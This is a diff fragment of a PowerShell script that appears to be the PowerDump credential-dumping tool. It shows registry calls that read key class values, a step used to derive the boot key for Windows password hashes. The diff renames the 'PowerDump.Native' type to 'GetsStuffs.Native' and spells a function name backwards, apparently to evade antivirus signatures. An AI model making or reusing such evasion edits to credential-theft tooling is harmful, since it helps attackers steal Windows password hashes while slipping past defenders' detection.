@@ -141,7 +141,7 @@ function GetThosePrivileges{
 function LoadBytes {
     $oldErrorAction = $global:ErrorActionPreference
     $global:ErrorActionPreference = "SilentlyContinue"
-    $test = [PowerDump.Native]
+    $test = [GetsStuffs.Native]
     $global:ErrorActionPreference = $oldErrorAction
 
     if ($test) {
@@ -342,18 +342,18 @@ function ssalCyeKgeR-teG([string]$key, [string]$subkey) {
     $result = ""
     [int]$hkey = 0
 
-    if (-not [PowerDump.Native]::RegOpenKeyEx($nkey, $subkey, 0, $KEYREAD, [ref]$hkey)) {
+    if (-not [GetsStuffs.Native]::RegOpenKeyEx($nkey, $subkey, 0, $KEYREAD, [ref]$hkey)) {
         $classVal = New-Object Text.StringBuilder 1024
         [int]$len = 1024
 
-        if (-not [PowerDump.Native]::RegQueryInfoKey($hkey, $classVal, [ref]$len, 0, [ref]$null, [ref]$null,
+        if (-not [GetsStuffs.Native]::RegQueryInfoKey($hkey, $classVal, [ref]$len, 0, [ref]$null, [ref]$null,
             [ref]$null, [ref]$null, [ref]$null, [ref]$null, [ref]$null, 0)) {
             $result = $classVal.ToString()
         } else {
             Write-Error "RegQueryInfoKey failed"
         }
 
-        [PowerDump.Native]::RegCloseKey($hkey) | Out-Null
+        [GetsStuffs.Native]::RegCloseKey($hkey) | Out-Null
     } else {
         Write-Error "Cannot open key"
     }
